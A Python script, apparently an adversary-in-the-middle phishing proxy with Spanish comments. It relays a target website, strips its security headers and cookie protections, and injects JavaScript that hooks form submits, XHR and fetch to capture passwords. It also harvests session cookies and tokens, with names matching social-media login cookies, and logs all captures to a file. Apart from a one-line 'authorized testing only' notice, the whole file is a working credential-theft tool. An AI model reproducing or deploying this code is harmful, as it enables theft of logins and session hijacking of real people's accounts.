#!/usr/bin/env python3

import os, sys, json, re, ssl, socket, threading, time
from datetime import datetime
from urllib.parse import urlparse, parse_qs, unquote, urljoin
import warnings
warnings.filterwarnings('ignore')

try:
    import requests
    from flask import (Flask, request as freq, Response, make_response)
except ImportError:
    os.system("pip3 install requests flask -q")
    import requests
    from flask import (Flask, request as freq, Response, make_response)

try: requests.packages.urllib3.disable_warnings()
except: pass

BASE = os.path.dirname(os.path.abspath(__file__))

# Colores
R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'
M='\033[95m'; CY='\033[96m'; W='\033[97m'; BOLD='\033[1m'
DIM='\033[2m'; RST='\033[0m'

# Headers que NO se copian
SKIP_REQ = {'host','content-length','transfer-encoding','connection',
            'keep-alive','upgrade','proxy-connection','te','trailers'}

STRIP_RESP = {'transfer-encoding','connection','keep-alive','content-encoding',
              'content-length','content-security-policy','content-security-policy-report-only',
              'strict-transport-security','x-frame-options','x-content-type-options',
              'x-xss-protection','permissions-policy','cross-origin-opener-policy',
              'cross-origin-embedder-policy','cross-origin-resource-policy',
              'expect-ct','public-key-pins','report-to','nel'}

CRED_RE = re.compile(
    r'(pass|pwd|password|passwd|secret|token|auth|key|session|credential|'
    r'login|user|email|usr|account|pin|otp|code|2fa|mfa|enc_password|'
    r'username|phone|cel|numero)', re.I)


class MITMProxy:

    def __init__(self, target, port=8080, certfile=None, keyfile=None):
        self.port = port
        self.certfile = certfile
        self.keyfile = keyfile
        self.logfile = os.path.join(BASE, "captured.json")
        self.captures = 0
        self.reqs = 0
        self.lock = threading.Lock()
        self.sessions = {}      # ip -> requests.Session (cookie jar propio)
        self.store = {}         # ip -> {cookies, tokens} para resumen

        # Target
        t = target.strip()
        if not t.startswith(('http://','https://')): t = 'https://' + t
        p = urlparse(t)
        self.scheme = p.scheme
        self.host = p.netloc
        self.origin = f"{p.scheme}://{p.netloc}"

        # Dominios del target (para reescribir URLs)
        base = self.host.replace('www.','')
        self.domains = set()
        for pfx in ['','www.','static.','api.','m.','i.','graph.','edge-chat.',
                     'upload.','scontent.','platform.','connect.','web.',
                     'accounts.','login.','l.','lm.','external.','z-m-scontent.',
                     'rupload.','edge-upload.','star.','pixel.','an.','tr.']:
            self.domains.add(f"{pfx}{base}")

        self.cdn_re = re.compile(
            r'(?:scontent|static|cdn|media|edge|z-m-scontent)[^./]*\.' + re.escape(base))

        # Flask
        self.app = Flask(__name__)
        import logging; logging.getLogger('werkzeug').setLevel(logging.ERROR)

        @self.app.route('/__ml__', methods=['POST'])
        def _ml():
            self._js_capture()
            return '', 204

        @self.app.route('/', defaults={'path':''}, methods=['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD'])
        @self.app.route('/<path:path>', methods=['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD'])
        def _proxy(path):
            return self._handle(path)

    # ===========================================================
    #  Session por cliente (cada IP tiene su cookie jar)
    # ===========================================================
    def _sess(self, ip):
        if ip not in self.sessions:
            s = requests.Session()
            s.verify = False
            s.max_redirects = 30
            s.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                              'AppleWebKit/537.36 (KHTML, like Gecko) '
                              'Chrome/125.0.0.0 Safari/537.36',
            })
            from requests.adapters import HTTPAdapter
            a = HTTPAdapter(pool_connections=20, pool_maxsize=40)
            s.mount("http://", a)
            s.mount("https://", a)
            self.sessions[ip] = s
            print(f"  {G}[+] Nueva sesion: {ip}{RST}")
        return self.sessions[ip]

    # ===========================================================
    #  PROXY HANDLER
    # ===========================================================
    def _handle(self, path):
        self.reqs += 1
        ip = freq.remote_addr
        sess = self._sess(ip)
        method = freq.method

        # URL destino
        tpath = f"/{path}"
        qs = freq.query_string.decode('utf-8', errors='replace')
        if qs: tpath += f"?{qs}"
        url = f"{self.origin}{tpath}"

        # Headers al backend
        hdrs = {}
        for k, v in freq.headers:
            if k.lower() in SKIP_REQ: continue
            if k.lower() in ('referer','origin'):
                v = self._to_real(v)
            hdrs[k] = v
        hdrs['Host'] = self.host
        hdrs['Accept-Encoding'] = 'identity'

        # Body
        body = freq.get_data() or None
        ct = freq.content_type or ''

        # Capturar POST
        if method in ('POST','PUT','PATCH') and body:
            self._sniff_post(ip, body, ct, url)

        # Sync cookies navegador -> session
        for cn, cv in freq.cookies.items():
            sess.cookies.set(cn, cv)

        # ===== REQUEST AL SERVIDOR REAL =====
        # Seguir redirects MANUALMENTE para evitar loops
        try:
            resp = self._do_request(sess, method, url, hdrs, body)
        except Exception as e:
            print(f"  {R}[!] Error: {url}: {e}{RST}")
            return Response(f"<h1>502</h1><p>{e}</p>", status=502)

        # Capturar cookies
        self._sniff_cookies(ip, sess, url)

        # Respuesta
        resp_body = resp.content
        resp_ct = resp.headers.get('Content-Type','')

        if 'text/html' in resp_ct or 'xhtml' in resp_ct:
            resp_body = self._rw_html(resp_body, resp.encoding)
        elif any(x in resp_ct for x in ['javascript','text/css','text/xml']):
            resp_body = self._rw_text(resp_body, resp.encoding)
        elif 'json' in resp_ct:
            self._sniff_json(ip, resp_body, url)
            resp_body = self._rw_text(resp_body, resp.encoding)

        # Flask response
        fr = make_response(resp_body, resp.status_code)
        for k, v in resp.headers.items():
            kl = k.lower()
            if kl in STRIP_RESP: continue
            if kl == 'location': v = self._to_proxy(v)
            if kl == 'set-cookie': continue
            fr.headers[k] = v

        # Set-Cookie al navegador (best effort)
        raw_sc = []
        if hasattr(resp.raw, 'headers') and hasattr(resp.raw.headers, 'getlist'):
            raw_sc = resp.raw.headers.getlist('Set-Cookie')
        if not raw_sc:
            sc = resp.headers.get('Set-Cookie')
            if sc: raw_sc = [sc]
        for sc in raw_sc:
            fr.headers.add('Set-Cookie', self._fix_ck(sc))

        # Log
        mc = G if method == 'GET' else Y
        sc_c = G if resp.status_code < 300 else (CY if resp.status_code < 400 else R)
        print(f"  {mc}{method:6}{RST} {sc_c}{resp.status_code}{RST} {tpath[:70]}")

        return fr

    # ===========================================================
    #  REQUEST CON REDIRECT MANUAL
    # ===========================================================
    def _do_request(self, sess, method, url, hdrs, body):
        visited = set()
        max_hops = 15
        current_url = url
        current_method = method
        current_body = body
        current_hdrs = dict(hdrs)

        for hop in range(max_hops):
            # Detectar loop
            key = f"{current_method}:{current_url}"
            if key in visited:
                print(f"  {Y}[loop] Redirect loop detectado en {current_url[:60]}, sirviendo ultima respuesta{RST}")
                # Hacer un ultimo request sin redirects y devolver lo que sea
                return sess.request(
                    method='GET', url=current_url, headers=self._clean_hdrs(current_hdrs),
                    allow_redirects=False, timeout=25, verify=False, stream=False
                )
            visited.add(key)

            # Request
            resp = sess.request(
                method=current_method,
                url=current_url,
                headers=self._clean_hdrs(current_hdrs),
                data=current_body if current_method in ('POST','PUT','PATCH') else None,
                allow_redirects=False,
                timeout=25,
                verify=False,
                stream=False
            )

            # No es redirect? Listo
            if resp.status_code not in (301, 302, 303, 307, 308):
                return resp

            # Es redirect - obtener Location
            location = resp.headers.get('Location', '')
            if not location:
                return resp  # Redirect sin Location, devolver tal cual

            # Hacer absoluta
            if not location.startswith('http'):
                location = urljoin(current_url, location)

            # Log redirect
            short_loc = urlparse(location).path[:50]
            print(f"  {DIM}  -> {resp.status_code} -> {short_loc}{RST}")

            # Siguiente hop
            if resp.status_code in (301, 302, 303):
                current_method = 'GET'
                current_body = None
            # 307/308 mantienen metodo

            # Actualizar host si cambio de dominio
            new_parsed = urlparse(location)
            current_hdrs['Host'] = new_parsed.netloc
            current_url = location

        # Excedio max_hops - devolver ultimo response
        print(f"  {Y}[!] Max redirects ({max_hops}) alcanzados{RST}")
        return resp

    def _clean_hdrs(self, hdrs):
        """Copia headers limpiando Accept-Encoding"""
        h = dict(hdrs)
        h['Accept-Encoding'] = 'identity'
        return h

    # ===========================================================
    #  URL REWRITING
    # ===========================================================
    def _to_proxy(self, url):
        if not url: return url
        for d in self.domains:
            url = url.replace(f"https://{d}", "")
            url = url.replace(f"http://{d}", "")
        return url or '/'

    def _to_real(self, url):
        if not url: return url
        p = urlparse(url)
        if not p.netloc or str(self.port) in str(p.netloc):
            return f"{self.origin}{p.path or '/'}{'?' + p.query if p.query else ''}"
        return url

    def _fix_ck(self, s):
        if not s: return s
        s = s.replace('__Secure-','').replace('__Host-','')
        s = re.sub(r';\s*[Dd]omain=[^;]*', '', s)
        s = re.sub(r';\s*[Ss]ecure\b', '', s)
        s = re.sub(r';\s*[Ss]ame[Ss]ite\s*=\s*\w+', '; SameSite=Lax', s)
        s = re.sub(r';\s*[Pp]ath=[^;]*', '; Path=/', s)
        return s

    # ===========================================================
    #  BODY REWRITING
    # ===========================================================
    def _dec(self, b, enc):
        for e in [enc, 'utf-8', 'latin-1']:
            if e:
                try: return b.decode(e)
                except: continue
        return b.decode('utf-8', errors='replace')

    def _url_replace(self, text):
        for d in self.domains:
            text = text.replace(f"https://{d}", "")
            text = text.replace(f"http://{d}", "")
            text = text.replace(f"https:\\/\\/{d}", "")
            text = text.replace(f"http:\\/\\/{d}", "")
            text = text.replace(f"//{d}", "")
        text = self.cdn_re.sub("", text)
        return text

    def _rw_html(self, body, enc):
        t = self._url_replace(self._dec(body, enc))
        js = self._inject_js()
        for tag in ['</head>','</body>','</html>']:
            if tag in t:
                t = t.replace(tag, f'{js}{tag}', 1)
                break
        else:
            t += js
        return t.encode('utf-8', errors='replace')

    def _rw_text(self, body, enc):
        return self._url_replace(self._dec(body, enc)).encode('utf-8', errors='replace')

    # ===========================================================
    #  JS INYECTADO
    # ===========================================================
    def _inject_js(self):
        return '''<script>
(function(){
var P=function(d){try{navigator.sendBeacon("/__ml__",JSON.stringify(d));}catch(e){
try{var x=new XMLHttpRequest();x.open("POST","/__ml__",true);
x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify(d));}catch(e2){}}};

document.addEventListener("submit",function(e){
var f=e.target;if(!f||f.tagName!=="FORM")return;
var d={};var inps=f.querySelectorAll("input,textarea,select");
for(var i=0;i<inps.length;i++){var inp=inps[i];
if(inp.name&&inp.value){d[inp.name]=inp.value;
if(inp.type==="password")d["__PWD__"]=inp.value;}}
P({t:"f",a:f.action,d:d});},true);

var XO=XMLHttpRequest.prototype.open,XS=XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.open=function(m,u){this._m=m;this._u=u;return XO.apply(this,arguments);};
XMLHttpRequest.prototype.send=function(b){
if(b&&(this._m==="POST"||this._m==="PUT"))
P({t:"x",m:this._m,u:this._u,b:typeof b==="string"?b:null});
return XS.apply(this,arguments);};

if(window.fetch){var F=window.fetch;
window.fetch=function(u,o){o=o||{};
if(o.body&&(o.method==="POST"||o.method==="PUT")){
try{var s=null;
if(typeof o.body==="string")s=o.body;
else if(o.body instanceof URLSearchParams)s=o.body.toString();
if(s)P({t:"h",m:o.method,u:typeof u==="string"?u:"",b:s});}catch(e){}}
return F.apply(this,arguments);};}
})();
</script>'''

    # ===========================================================
    #  SNIFFING
    # ===========================================================
    def _sniff_post(self, ip, body, ct, url):
        try: bs = body.decode('utf-8', errors='replace')
        except: return
        fields = {}
        if 'urlencoded' in ct or ('&' in bs and '=' in bs):
            try:
                for k, v in parse_qs(bs, keep_blank_values=True).items():
                    fields[k] = v[0] if v else ''
            except: pass
        elif 'json' in ct:
            try:
                j = json.loads(bs)
                if isinstance(j, dict): self._flat(j, fields)
            except: pass
        elif 'multipart' in ct:
            for m in re.finditer(r'name="([^"]+)"[\r\n]+([^\r\n-]+)', bs):
                fields[m.group(1)] = m.group(2).strip()
        if not fields and '=' in bs:
            for pair in bs.split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    fields[unquote(k)] = unquote(v)
        if not fields: return
        sens = {k: v for k, v in fields.items() if CRED_RE.search(k) and v}
        if sens:
            self._log(ip, 'CREDENTIALS', url, sens, fields)
        else:
            self._log(ip, 'POST_DATA', url, fields)

    def _flat(self, obj, r, pfx=''):
        if isinstance(obj, dict):
            for k, v in obj.items():
                f = f"{pfx}.{k}" if pfx else k
                if isinstance(v, (dict,list)): self._flat(v, r, f)
                else: r[f] = str(v) if v is not None else ''
        elif isinstance(obj, list):
            for i, x in enumerate(obj): self._flat(x, r, f"{pfx}[{i}]")

    def _sniff_cookies(self, ip, sess, url):
        """Revisa TODAS las cookies en el jar de la sesion"""
        interesting = {}
        for c in sess.cookies:
            nl = c.name.lower()
            if any(x in nl for x in ['session','token','auth','sid','jwt','access',
                    'refresh','login','sso','csrf','c_user','xs','fr','ds_user',
                    'datr','sb','dpr','wd','presence']):
                interesting[c.name] = c.value[:200]
        if interesting:
            # Solo loguear si hay cookies nuevas
            prev = self.store.get(ip, {}).get('cookies', {})
            new_ck = {k: v for k, v in interesting.items() if k not in prev or prev[k] != v}
            if new_ck:
                self._log(ip, 'COOKIES', url, new_ck)
                with self.lock:
                    if ip not in self.store:
                        self.store[ip] = {'cookies': {}, 'tokens': []}
                    self.store[ip]['cookies'].update(interesting)

    def _sniff_json(self, ip, body, url):
        try:
            j = json.loads(body.decode('utf-8', errors='replace'))
            if isinstance(j, dict):
                tk = {}; self._find_tk(j, tk)
                if tk:
                    self._log(ip, 'TOKENS', url, tk)
                    with self.lock:
                        if ip not in self.store:
                            self.store[ip] = {'cookies': {}, 'tokens': []}
                        self.store[ip]['tokens'].append(tk)
        except: pass

    def _find_tk(self, obj, r, pfx=''):
        TK = re.compile(r'(token|access_token|refresh_token|id_token|jwt|api_key|session_id|bearer|secret)', re.I)
        if isinstance(obj, dict):
            for k, v in obj.items():
                f = f"{pfx}.{k}" if pfx else k
                if isinstance(v, str) and TK.search(k) and len(v) > 5: r[f] = v[:200]
                elif isinstance(v, (dict,list)): self._find_tk(v, r, f)

    def _js_capture(self):
        try:
            data = freq.get_json(silent=True)
            if not data:
                try: data = json.loads(freq.get_data(as_text=True))
                except: return
            ip = freq.remote_addr
            t = data.get('t','')
            if t == 'f':
                flds = data.get('d', {})
                if isinstance(flds, dict) and flds:
                    sens = {k: v for k, v in flds.items() if CRED_RE.search(k) and v}
                    if sens: self._log(ip, 'FORM_CREDS', data.get('a',''), sens, flds)
            elif t in ('x','h'):
                b = data.get('b','')
                if b: self._sniff_post(ip, b.encode(), 'application/x-www-form-urlencoded', data.get('u',''))
        except: pass

    # ===========================================================
    #  LOGGING
    # ===========================================================
    def _log(self, ip, tipo, url, data, all_f=None):
        self.captures += 1
        e = {'id': self.captures, 'ts': datetime.now().isoformat(),
             'type': tipo, 'ip': ip, 'url': url, 'data': data}
        if all_f: e['all_fields'] = all_f
        with self.lock:
            try:
                a = []
                if os.path.exists(self.logfile):
                    with open(self.logfile) as f: a = json.load(f)
                a.append(e)
                with open(self.logfile, 'w') as f: json.dump(a, f, indent=2, ensure_ascii=False)
            except: pass
        self._show(e)

    def _show(self, e):
        clrs = {'CREDENTIALS': R, 'FORM_CREDS': R, 'COOKIES': M,
                'TOKENS': CY, 'POST_DATA': Y}
        c = clrs.get(e['type'], W)
        print(f"\n{c}{'='*70}")
        print(f"  [{e['type']}] #{e['id']}")
        print(f"{'='*70}{RST}")
        print(f"  {DIM}Hora:{RST} {e['ts']}")
        print(f"  {DIM}IP:{RST}   {e['ip']}")
        print(f"  {DIM}URL:{RST}  {e['url'][:80]}")

        if e['type'] in ('CREDENTIALS','FORM_CREDS'):
            print(f"\n  {R}{BOLD}*** CREDENCIALES ***{RST}")
            for k, v in e['data'].items():
                kl = k.lower()
                if any(x in kl for x in ['pass','pwd','secret','__pwd']):
                    print(f"  {R}{BOLD}  PASSWORD: {v}{RST}")
                elif any(x in kl for x in ['user','email','login','phone','account']):
                    print(f"  {G}{BOLD}  USUARIO:  {v}{RST}")
                elif any(x in kl for x in ['token','auth']):
                    print(f"  {CY}  TOKEN:   {v[:80]}{RST}")
                else:
                    print(f"  {Y}  {k}: {v}{RST}")
            if e.get('all_fields'):
                extra = {k: v for k, v in e['all_fields'].items() if k not in e['data']}
                if extra:
                    print(f"  {DIM}Otros:{RST}")
                    for k, v in extra.items(): print(f"  {DIM}  {k}: {v}{RST}")

        elif e['type'] == 'COOKIES':
            print(f"  {M}{BOLD}Cookies:{RST}")
            for k, v in e['data'].items():
                print(f"  {M}  {k}: {str(v)[:70]}{RST}")

        elif e['type'] == 'TOKENS':
            print(f"  {CY}Tokens:{RST}")
            for k, v in e['data'].items():
                print(f"  {CY}  {k}: {str(v)[:80]}{RST}")
        else:
            for k, v in e['data'].items():
                print(f"  {Y}  {k}: {str(v)[:100]}{RST}")
        print(f"{c}{'='*70}{RST}")

    # ===========================================================
    #  START
    # ===========================================================
    def start(self):
        lip = _lip()
        print(f"\n{M}{'='*70}")
        print(f"{'MITM REVERSE PROXY'.center(70)}")
        print(f"{'='*70}{RST}")
        print(f"  {BOLD}Proxy:{RST}    http://0.0.0.0:{self.port}")
        print(f"  {BOLD}LAN:{RST}      http://{lip}:{self.port}")
        print(f"  {BOLD}Target:{RST}   {self.origin}")
        print(f"  {BOLD}Log:{RST}      {self.logfile}")
        print()
        print(f"\n  {DIM}Ctrl+C para detener{RST}")
        print(f"{M}{'='*70}{RST}\n")

        try:
            ctx = None
            if self.certfile and self.keyfile:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(self.certfile, self.keyfile)
            self.app.run(host='0.0.0.0', port=self.port, debug=False,
                        threaded=True, ssl_context=ctx)
        except KeyboardInterrupt:
            self._end()
        except OSError as e:
            if 'Address already in use' in str(e):
                print(f"{R}[-] Puerto {self.port} en uso{RST}")
                print(f"    kill -9 $(lsof -ti:{self.port})")

    def _end(self):
        print(f"\n{M}{'='*70}\n{'RESUMEN'.center(70)}\n{'='*70}{RST}")
        print(f"  Requests: {self.reqs} | Capturas: {self.captures} | Clientes: {len(self.sessions)}")
        for sip, data in self.store.items():
            nc = len(data.get('cookies',{}))
            print(f"\n  {G}{sip}{RST}: {nc} cookies")
            for n, v in data.get('cookies',{}).items():
                print(f"    {DIM}{n}: {v[:60]}{RST}")
        print(f"\n  Archivo: {self.logfile}")
        print(f"{M}{'='*70}{RST}\n")


def _lip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1); s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except: return "127.0.0.1"

def _arg(f, d=None):
    if f in sys.argv:
        try: return sys.argv[sys.argv.index(f)+1]
        except: pass
    return d

def main():
    print(f"""
{M}{'='*70}
{'MITM Reverse Proxy v1.0'.center(70)}
{'='*70}{RST}
  {Y}Uso:{RST}
    python3 {sys.argv[0]} --target ejemplo.com
    python3 {sys.argv[0]} --target ejemplo.com --port 9090
    python3 {sys.argv[0]} --target ejemplo.com --ssl-cert c.pem --ssl-key k.pem

  {R}Solo para pruebas autorizadas.{RST}
{M}{'='*70}{RST}
""")

    target = _arg('--target')
    port = int(_arg('--port', '8080'))
    sc = _arg('--ssl-cert')
    sk = _arg('--ssl-key')

    if not target:
        target = input(f"  {CY}URL objetivo: {RST}").strip()
        if not target: print("[-] Requerida"); sys.exit(1)
    p = input(f"  {CY}Puerto [{port}]: {RST}").strip()
    if p:
        try: port = int(p)
        except: pass

    MITMProxy(target, port, sc, sk).start()

if __name__ == "__main__":
    main()
